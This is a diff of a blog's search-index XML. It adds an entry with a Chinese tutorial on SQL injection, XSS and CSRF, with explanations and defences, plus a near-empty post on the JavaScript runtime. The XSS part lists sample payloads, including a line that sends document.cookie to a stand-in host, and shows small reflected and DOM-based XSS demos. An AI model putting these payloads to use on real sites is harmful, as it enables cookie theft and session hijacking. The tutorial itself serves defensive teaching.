@@ -4,6 +4,72 @@
   
     
     <entry>
+      <title>javascript运行原理</title>
+      <link href="/2022/03/11/js-runtime/"/>
+      <url>/2022/03/11/js-runtime/</url>
+      
+        <content type="html"><![CDATA[<p><img src="https://www.bilibili.com/video/BV1vh411Z7QG" alt="参考视频"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> FrontEnd-Tec </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> node </tag>
+            
+            <tag> javascript </tag>
+            
+            <tag> v8 </tag>
+            
+            <tag> parser </tag>
+            
+            <tag> interpreter </tag>
+            
+            <tag> compiler </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>常见的web攻击及防范</title>
+      <link href="/2022/03/08/web-attack/"/>
+      <url>/2022/03/08/web-attack/</url>
+      
+        <content type="html"><![CDATA[<h2 id="SQL-注入"><a href="#SQL-注入" class="headerlink" title="SQL 注入"></a>SQL 注入</h2><blockquote><p>所谓 SQL 注入，就是通过把 SQL 命令插入到 Web 表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的 SQL 命令。</p></blockquote><h3 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h3><p>SQL 注入攻击指的是通过构建特殊的输入作为参数传入 Web 应用程序，而这些输入大都是 SQL 语法里的一些组合，通过执行 SQL 语句进而执行攻击者所要的操作，其主要原因是程序没有细致地过滤用户输入的数据，致使非法数据侵入系统。</p><h3 id="被攻击的原因"><a href="#被攻击的原因" class="headerlink" title="被攻击的原因:"></a>被攻击的原因:</h3><blockquote><p>sql 语句伪造参数，然后在对参数进行拼接的后形成破坏性的 sql 语句，最后导致数据库受到攻击</p></blockquote><h3 id="防护："><a href="#防护：" class="headerlink" title="防护："></a>防护：</h3><ul><li>永远不要信任用户的输入。对用户的输入进行校验，可以通过正则表达式，或限制长度；对单引号和双”-“进行转换等。</li><li>永远不要使用动态拼装 sql，可以使用参数化的 sql 或者直接使用存储过程进行数据查询存取。</li><li>永远不要使用管理员权限的数据库连接，为每个应用使用单独的权限有限的数据库连接。</li><li>不要把机密信息直接存放，加密或者 hash 掉密码和敏感的信息。</li><li>应用的异常信息应该给出尽可能少的提示，最好使用自定义的错误信息对原始错误信息进行包装</li><li>sql 注入的检测方法一般采取辅助软件或网站平台来检测，软件一般采用 sql 注入检测工具 jsky，网站平台就有亿思网站安全平台检测工具。MDCSOFT SCAN 等。采用 MDCSOFT-IPS 可以有效的防御 SQL 注入，XSS 攻击等。</li><li>7.使用预编译语句(PreparedStatement)，这样的话即使我们使用 sql 语句伪造成参数，到了服务端的时候，这个伪造 sql 语句的参数也只是简单的字符，并不能起到攻击的作用。</li></ul><h2 id="跨站脚本攻击-XSS"><a href="#跨站脚本攻击-XSS" class="headerlink" title="跨站脚本攻击(XSS)"></a>跨站脚本攻击(XSS)</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>跨站脚本攻击（XSS，Cross-site scripting）是最常见和基本的攻击 WEB 网站的方法。攻击者在网页上发布包含攻击性代码的数据。当浏览者看到此网页时，特定的脚本就会以浏览者用户的身份和权限来执行。通过 XSS 可以比较容易地修改用户数据、窃取用户信息，以及造成其它类型的攻击，例如 CSRF 攻击</p><h3 id="被攻击的原因-1"><a href="#被攻击的原因-1" class="headerlink" title="被攻击的原因"></a>被攻击的原因</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">- &lt;script&gt;alert(&quot;反射型 XSS 攻击&quot;)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">- &lt;script&gt;alert(‘xss’)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">- &lt;a href=&#x27;&#x27; onclick=alert(&#x27;xss&#x27;)&gt;type&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">- &lt;img src=http://1.1.1.1/a.jpg onerror=alert(&#x27;xss&#x27;)&gt;</span><br><span class="line"></span><br><span class="line">- &lt;script&gt;window.location=‘http://192.168.1.1&#x27;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">- &lt;iframe SRC=&quot;http://1.1.1.1/a.jpg&quot; height = &quot;0&quot; width =&quot;0&quot;&gt;&lt;/iframe&gt;</span><br><span class="line"></span><br><span class="line">- &lt;script&gt;new Image().src=&quot;http://1.1.1.1/c.php?output=&quot;+document.cookie;&lt;/script&gt;</span><br></pre></td></tr></table></figure><blockquote><p>用户输入的数据变成了代码，比如说上面的 script,应该只是字符串却有了代码的作用。</p></blockquote><h3 id="三种方式"><a href="#三种方式" class="headerlink" title="三种方式"></a>三种方式</h3><p><code>反射型 XSS </code></p><p>只是简单地把用户输入的数据 “反射” 给浏览器，这种攻击方式往往需要攻击者诱使用户点击一个恶意链接，或者提交一个表单，或者进入一个恶意网站时，注入脚本进入被攻击者的网站。</p><p>访问 localhost:3000 页面上的恶意链接,恶意链接的地址指向了 localhost:8001,我们启动一个 8001 的服务,这样就产生了反射型 XSS 攻击。攻击者可以注入任意的恶意脚本进行攻击，可能注入恶作剧脚本，或者注入能获取用户隐私数据(如 cookie)的脚本，这取决于攻击者的目的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">const http = require(&#x27;http&#x27;);</span><br><span class="line">function handleReequest(req, res) &#123;</span><br><span class="line">    res.setHeader(&#x27;Access-Control-Allow-Origin&#x27;, &#x27;*&#x27;);</span><br><span class="line">    res.writeHead(200, &#123;&#x27;Content-Type&#x27;: &#x27;text/html; charset=UTF-8&#x27;&#125;);</span><br><span class="line">    res.write(&#x27;&lt;script&gt;alert(&quot;反射型 XSS 攻击&quot;)&lt;/script&gt;&#x27;);</span><br><span class="line">    res.end();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const server = new http.Server();</span><br><span class="line">server.listen(8001, &#x27;127.0.0.1&#x27;);</span><br><span class="line">server.on(&#x27;request&#x27;, handleReequest);</span><br></pre></td></tr></table></figure><p><code>存储型</code></p><p>存储型 XSS 会把用户输入的数据 “存储” 在服务器端，当浏览器请求数据时，脚本从服务器上传回并执行。这种 XSS 攻击具有很强的稳定性。</p><p>比较常见的一个场景是攻击者在社区或论坛上写下一篇包含恶意 JavaScript 代码的文章或评论，文章或评论发表后，所有访问该文章或评论的用户，都会在他们的浏览器中执行这段恶意的 JavaScript 代码。</p><p><code>基于DOM</code></p><p>基于 DOM 的 XSS 攻击是指通过恶意脚本修改页面的 DOM 结构，是纯粹发生在客户端的攻击。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;h2&gt;XSS: &lt;/h2&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; id=&quot;input&quot;&gt;</span><br><span class="line">&lt;button id=&quot;btn&quot;&gt;Submit&lt;/button&gt;</span><br><span class="line">&lt;div id=&quot;div&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    const input = document.getElementById(&#x27;input&#x27;);</span><br><span class="line">    const btn = document.getElementById(&#x27;btn&#x27;);</span><br><span class="line">    const div = document.getElementById(&#x27;div&#x27;);</span><br><span class="line"></span><br><span class="line">    let val;</span><br><span class="line"></span><br><span class="line">    input.addEventListener(&#x27;change&#x27;, (e) =&gt; &#123;</span><br><span class="line">        val = e.target.value;</span><br><span class="line">    &#125;, false);</span><br><span class="line"></span><br><span class="line">    btn.addEventListener(&#x27;click&#x27;, () =&gt; &#123;</span><br><span class="line">        div.innerHTML = `&lt;a href=$&#123;val&#125;&gt;testLink&lt;/a&gt;`</span><br><span class="line">    &#125;, false);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>点击 Submit 按钮后，会在当前页面插入一个链接，其地址为用户的输入内容。如果用户在输入时构造了如下内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27; onclick=alert(/xss/)</span><br></pre></td></tr></table></figure><p>用户提交之后，页面代码就变成了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href onlick=&quot;alert(/xss/)&quot;&gt;testLink&lt;/a&gt;</span><br></pre></td></tr></table></figure><p><img src="https://user-images.githubusercontent.com/7871813/42721109-cb7ce572-8766-11e8-96d9-9ada8a787827.gif"></p><h3 id="防护：-1"><a href="#防护：-1" class="headerlink" title="防护："></a>防护：</h3><ul><li>确保输出到 HTML 页面的数据以 HTML 的方式被转义</li><li>前端框架中，都会有一份 decodingMap， 用于对用户输入所包含的特殊字符或标签进行编码或过滤，如 &lt;，&gt;，script，防止 XSS 攻击：</li><li>设置 HttpOnly 严格来说，HttpOnly 并非阻止 XSS 攻击，而是能阻止 XSS 攻击后的 Cookie 劫持攻击。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// vuejs 中的 decodingMap</span><br><span class="line">// 在 vuejs 中，如果输入带 script 标签的内容，会直接过滤掉</span><br><span class="line">const decodingMap = &#123;</span><br><span class="line">  &#x27;&amp;lt;&#x27;: &#x27;&lt;&#x27;,</span><br><span class="line">  &#x27;&amp;gt;&#x27;: &#x27;&gt;&#x27;,</span><br><span class="line">  &#x27;&amp;quot;&#x27;: &#x27;&quot;&#x27;,</span><br><span class="line">  &#x27;&amp;amp;&#x27;: &#x27;&amp;&#x27;,</span><br><span class="line">  &#x27;&amp;#10;&#x27;: &#x27;\n&#x27;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="跨站请求伪造攻击（CSRF"><a href="#跨站请求伪造攻击（CSRF" class="headerlink" title="跨站请求伪造攻击（CSRF)"></a>跨站请求伪造攻击（CSRF)</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>跨站请求伪造（CSRF，Cross-site request forgery）是另一种常见的攻击。攻击者通过各种方法伪造一个请求，模仿用户提交表单的行为，从而达到修改用户的数据，或者执行特定任务的目的。为了假冒用户的身份，CSRF 攻击常常和 XSS 攻击配合起来做，但也可以通过其它手段，例如诱使用户点击一个包含攻击的链接</p><h3 id="被攻击的原因："><a href="#被攻击的原因：" class="headerlink" title="被攻击的原因："></a>被攻击的原因：</h3><ul><li><p>用户本地存储 cookie，攻击者利用用户的 cookie 进行认证，然后伪造用户发出请求</p></li><li><p>之所以被攻击是因为攻击者利用了存储在浏览器用于用户认证的 cookie，那么如果我们不用 cookie 来验证不就可以预防了。所以我们可以采用 token（不存储于浏览器）认证，为每一个提交的表单生成一个随机 token， 存储在 session 中，每次验证表单 token，检查 token 是否正确。。</p></li><li><p>通过 referer 识别，HTTP Referer 是 header 的一部分，当浏览器向 web 服务器发送请求的时候，一般会带上 Referer，告诉服务器我是从哪个页面链接过来的，服务器基此可以获得一些信息用于处理。那么这样的话，我们必须登录银行 A 网站才能进行转账了。</p></li></ul><h3 id="防护：-2"><a href="#防护：-2" class="headerlink" title="防护："></a>防护：</h3><ul><li>采用 POST 请求,增加攻击的难度.用户点击一个链接就可以发起 GET 类型的请求。而 POST 请求相对比较难，攻击者往往需要借助 javascript 才能实现</li><li>对请求进行认证，确保该请求确实是用户本人填写表单并提交的，而不是第三者伪造的.具体可以在会话中增加 token,确保看到信息和提交信息的是同一个人</li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> FrontEnd-Tec </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> javascript </tag>
+            
+            <tag> web </tag>
+            
+            <tag> xss </tag>
+            
+            <tag> csrf </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>如何优雅的发布npm包</title>
       <link href="/2022/02/10/npm-publish/"/>
       <url>/2022/02/10/npm-publish/</url>
@@ -174,7 +240,7 @@
     
     
     <entry>
-      <title>js引用类型的用法</title>
+      <title>javascript引用类型的用法</title>
       <link href="/2021/08/21/object-type/"/>
       <url>/2021/08/21/object-type/</url>
       
